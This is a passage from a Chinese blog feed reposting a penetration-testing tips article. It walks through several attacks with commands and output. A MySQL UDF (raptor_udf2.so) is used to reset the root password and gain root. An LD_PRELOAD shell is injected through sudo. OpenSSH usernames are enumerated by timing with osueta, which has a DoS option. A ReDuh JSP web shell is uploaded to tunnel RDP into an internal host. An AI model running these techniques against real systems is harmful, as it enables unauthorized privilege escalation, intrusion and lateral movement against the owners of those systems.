mysql&gt; create function do_system returns integer soname <span class="hljs-string">'raptor_udf2.so'</span>;
mysql&gt; <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> mysql.func;
mysql&gt; <span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">do_system</span>(<span class="hljs-params"><span class="hljs-string">'echo "root:passwd" | chpasswd &gt; /tmp/out; chown user:user /tmp/out'</span></span>)</span>;

<p>user:<del>$ su -<br>Password:<br>user:</del><span class="hljs-meta"># whoami</span><br>root<br>root:~<span class="hljs-meta"># id</span><br>uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root)<br></code></pre></div></p>
<h3><span id="-ld-preload">使用 LD_PRELOAD 注入程序</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs ruby">$ wget <span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/github.com/jivoi</span><span class="hljs-regexp">/pentest/ldpreload</span>_shell.c
$ gcc -shared -fPIC ldpreload_shell.c -o ldpreload_shell.so
$ sudo -u user LD_PRELOAD=<span class="hljs-regexp">/tmp/ldpreload</span>_shell.so /usr/local/bin/somesoft
</code></pre></div>
<h3><span id="-openssh">针对 OpenSSH 用户进行枚举时序攻击</span></h3>
<p>注：枚举时序攻击(“Enumeration Timing Attack”)属于侧信道攻击/旁路攻击(Side Channel Attack)，侧信道攻击是指利用信道外的信息，比如加解密的速度/加解密时芯片引脚的电压/密文传输的流量和途径等进行攻击的方式，一个词形容就是“旁敲侧击”。–参考自 <a href="http://zhihu.com/question/20156213/answer/43377769" target="_blank" rel="noopener">shotgun</a> 在知乎上的解释。</p>
<p>osueta 是一个用于对 OpenSSH 进行时序攻击的 python2 脚本，其可以利用时序攻击枚举 OpenSSH 用户名，并在一定条件下可以对 OpenSSH 服务器进行 DOS 攻击。</p>
<div class="hljs code-wrapper"><pre><code class="hljs coffeescript"><span class="hljs-comment"># https://github.com/c0r3dump3d/osueta</span>
$ ./osueta.py -H <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.6</span> -p <span class="hljs-number">22</span> -U root -d <span class="hljs-number">30</span> -v <span class="hljs-literal">yes</span>
$ ./osueta.py -H <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.22</span> -p <span class="hljs-number">22</span> -d <span class="hljs-number">15</span> -v <span class="hljs-literal">yes</span> –dos <span class="hljs-literal">no</span> -L userfile.txt
</code></pre></div>
<h3><span id="-reduh-http-tcp">使用 ReDuh 构造合法的 HTTP 请求以建立 TCP 通道</span></h3>
<p>注： ReDuh 是一个通过 HTTP 协议建立隧道传输各种其他数据的工具。其可以把内网服务器的端口通过 http/https 隧道转发到本机，形成一个连通回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口。</p>
<p>对了亲～ReDuh-Gui 号称端口转发神器哦。</p>
<div class="hljs code-wrapper"><pre><code class="hljs dts"><span class="hljs-meta"># https:<span class="hljs-comment">//github.com/sensepost/reDuh</span></span>

<p><span class="hljs-meta"># 步骤 1</span><br><span class="hljs-meta"># 上传 reDuh.jsp 目标服务器</span><br>$ http:<span class="hljs-comment">//192.168.10.50/uploads/reDuh.jsp</span></p>
<p><span class="hljs-meta"># 步骤 2</span><br><span class="hljs-meta"># 在本机运行 reDuhClient </span><br>$ java -jar reDuhClient.jar http:<span class="hljs-comment">//192.168.10.50/uploads/reDuh.jsp</span></p>
<p><span class="hljs-meta"># 步骤 3</span><br><span class="hljs-meta"># 使用 nc 连接管理端口</span><br>$ nc -nvv <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">1010</span></p>
<p><span class="hljs-meta"># 步骤 4</span><br><span class="hljs-meta"># 使用隧道转发本地端口到远程目标端口</span><br>[createTunnel] <span class="hljs-number">7777</span>:<span class="hljs-number">172.16</span><span class="hljs-number">.0</span><span class="hljs-number">.4</span>:<span class="hljs-number">3389</span></p>
<p><span class="hljs-meta"># 步骤 5</span><br><span class="hljs-meta"># 使用 RDP 连接远程</span><br>$ <span class="hljs-meta-keyword">/usr/</span>bin/rdesktop -g <span class="hljs-number">1024</span>x768 -P -z -x l -k en-us -r sound:off localhost:<span class="hljs-number">7777</span><br></code></pre></div></p>
<p>*原文：<a href="http://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/" target="_blank" rel="noopener">jivoi</a>，FB小编xiaix编译，转自FreeBuf黑客与极客（FreeBuf.COM）</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>转载</tag>
        <tag>渗透学习</tag>
      </tags>
  </entry>
</search>
